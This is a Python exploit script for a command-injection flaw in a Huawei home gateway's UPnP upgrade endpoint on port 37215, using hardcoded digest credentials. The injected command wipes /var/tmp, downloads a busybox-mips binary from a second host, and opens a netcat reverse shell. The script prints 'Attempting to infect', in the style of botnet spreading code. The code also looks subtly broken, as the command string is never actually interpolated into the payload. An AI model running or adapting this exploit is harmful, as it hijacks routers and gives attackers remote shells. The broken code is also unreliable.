import threading, sys, time, random, socket, re, os, struct, array, requests
from requests.auth import HTTPDigestAuth

ip = '192.168.142.131'
cmd = 'rm -rf /var/tmp; mkdir /var/tmp; /usr/bin/wget -g -l /var/tmp/busybox-mips -r /busybox-mips 192.168.142.130; chmod 755 /var/tmp/busybox-mips; export PATH=$PATH:/var/tmp; busybox-mips nc 192.168.142.130 8898 -e /bin/sh'
Authorization = "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"

headers = {"Authorization": Authorization}

data = f'''
<?xml version="1.0" ?>
<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
            <NewStatusURL>http://$(" + cmd + ")</NewStatusURL>
            <NewDownloadURL>http://$(echo HG)</NewDownloadURL>
        </u:Upgrade>
    </s:Body>
</s:Envelope>
'''
class exploit(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1"
				requests.post(url,headers = headers, data=data)
				print("Attempting to infect " + self.ip)
			except Exception as e:
				print(e)
				pass

def main():
	try:
		n = exploit(ip)
		n.start()
		time.sleep(1)
	except Exception as e:
		print(e)

if __name__ == "__main__":
    main()
